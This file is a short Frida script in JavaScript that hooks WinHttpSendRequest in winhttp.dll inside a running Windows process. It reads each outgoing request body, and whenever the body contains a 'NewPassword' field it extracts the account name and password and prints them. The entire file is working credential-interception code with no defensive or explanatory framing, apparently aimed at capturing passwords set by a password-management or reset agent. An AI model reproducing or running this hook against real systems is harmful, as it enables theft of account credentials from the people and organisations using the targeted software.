const moduleName = 'winhttp.dll';
const targetFunctionName = 'WinHttpSendRequest'

const targetModule = Process.enumerateModules().find(mod => mod.name.toLowerCase().includes(moduleName.toLowerCase()));

if (targetModule !== undefined) {
    const baseAddr = targetModule.base;
    const targetFuncAddr = targetModule.getExportByName(targetFunctionName);
    console.log(`[+] Base address of ${moduleName}: ${baseAddr}`);
    console.log(`[+] Hooking function ${targetFunctionName} at address: ${targetFuncAddr}`);

    Interceptor.attach(targetFuncAddr, {
        onEnter: function (args) {
            console.log('[GET] WinHttpSendRequest');
            
                    const rawData = args[3].readAnsiString();
            
                    if (rawData.includes("NewPassword")) {
                        console.log(rawData);
            
                        try {
                            const cleanedJson = rawData.replace(/0x[0-9a-fA-F]+/g, match => parseInt(match, 16));
                            const obj = JSON.parse(cleanedJson);
            
                            const username = obj.AccountName;
                            const password = obj.NewPassword;
            
                            console.log(` --> Username: ${username} / Password: ${password}`);
                        } catch (err) {
                            console.log(` --> Error parsing JSON or extracting credentials: ${err.message}`);
                        }
                    }
        },
        onLeave: function (retval) {
            // No operation
        }
    });
} else {
    console.error(`[-] Could not find base address for ${moduleName}`);
}
